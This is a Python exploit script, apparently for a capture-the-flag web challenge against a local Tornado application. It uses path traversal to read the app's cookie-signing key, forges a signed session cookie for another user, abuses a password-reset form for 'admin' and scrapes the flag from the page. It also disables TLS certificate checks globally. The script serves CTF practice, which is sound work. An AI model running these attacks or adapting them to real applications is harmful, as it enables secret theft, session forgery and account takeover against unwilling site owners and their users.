import re
import sys

import requests
import requests as req
from pyquery import PyQuery as PQ
import string
import random
import re

import urllib
import urllib2
import base64
import hashlib
import hmac
import time

from tornado import escape
from tornado.escape import utf8
import ssl
ssl._create_default_https_context = ssl._create_unverified_context


def create_signed_value(secret, name, value, version=None, clock=None,
                        key_version=None):
    if version is None:
        version = 1
    if clock is None:
        clock = time.time

    timestamp = utf8(str(int(clock())))
    value = base64.b64encode(utf8(value))
    if version == 1:
        signature = create_signature_v1(secret, name, value, timestamp)
        value = b"|".join([value, timestamp, signature])
        return value
    elif version == 2:
        def format_field(s):
            return utf8("%d:" % len(s)) + utf8(s)

        to_sign = b"|".join([
            b"2",
            format_field(str(key_version or 0)),
            format_field(timestamp),
            format_field(name),
            format_field(value),
            b''])

        if isinstance(secret, dict):

          assert key_version is not None, 'Key version must be set when sign key dict is used'
          assert version >= 2, 'Version must be at least 2 for key version support'
          secret = key_version

        signature = create_signature_v2(secret, to_sign)
        return to_sign + signature
    else:
        raise ValueError("Unsupported version %d" % version)


def create_signature_v2(secret, s):
    hash = hmac.new(utf8(secret), digestmod=hashlib.sha256)
    hash.update(utf8(s))
    return utf8(hash.hexdigest())

def create_signature_v1(secret, *parts):
    hash = hmac.new(utf8(secret), digestmod=hashlib.sha1)
    for part in parts:
        hash.update(utf8(part))
    return utf8(hash.hexdigest())



class WebChecker:

    def __init__(self, ip, port, csrfname = '_xsrf'):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        self.username = 'zx'
        self.password = 'zx'
        self.change_pass = '654321'
        self.mail = 'i@qvq.im'
        self.csrfname = csrfname
        self.integral = None
        self.session = req.session()


    def _generate_randstr(self, len = 10):
        return ''.join(random.sample(string.ascii_letters, len))



    def _get_uuid(self, html):
        dom = PQ(html)
        return dom('form canvas').attr('rel')

    def _get_answer(self, html):
        uuid = self._get_uuid(html)
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x,y



    def _get_user_integral(self):
        res = self.session.get(self.url + 'user')
        dom = PQ(res.text)
        res = dom('div.user-info').text()
        integral = re.search('(\d+\.\d+)', res).group()
        return integral



    def _get_token(self, html):
        dom = PQ(html)
        form = dom("form")
        token = str(PQ(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token

    def exp_resetpsw(self):

        res = self.session.get(self.url + 'pass/reset')
        html = res.text
        token = self._get_token(html)

        rs = self.session.post(self.url + 'pass/reset', data={
            self.csrfname: token,
            "username":"admin"
        })

        res=self.session.get(self.url + 'user')
        dom = PQ(res.text)
        failed = dom('div')
        failed=PQ(failed).text().strip()
        flag=re.findall(r"flag=(.+?) if", failed)
        print flag

    def exp_make_cookie(self):
        url = "http://localhost:8233/static/../assets.key"

        req = urllib2.Request(url)

        res_data = urllib2.urlopen(req)
        key = res_data.read()

        tt=escape.native_str(create_signed_value(key, 'username', 'Jack_Ma', version=None,key_version=None))



        rs = self.session.get(self.url + 'login')
        html = rs.text
        token = self._get_token(html)
        x, y = self._get_answer(html)

        # rs = self.session.post(url=self.url + 'login', data={
        #     self.csrfname: token,
        #     "username": "as",
        # })
        cookie={ self.csrfname: token,
               "username":tt}
        rs = self.session.get(url=self.url + 'user', cookies=cookie)
        dom = PQ(rs.text)
        failed = dom('div')
        failed = PQ(failed).text().strip()

        flag = re.findall(r"flag=(.+?) if", failed)
        print flag

if __name__ == '__main__':
    ip = '127.0.0.1'
    port = 8233
    csrfname = '_xsrf'
    check = WebChecker(str(ip), str(port), csrfname)
    #check.exp_resetpsw()
    check.exp_make_cookie()

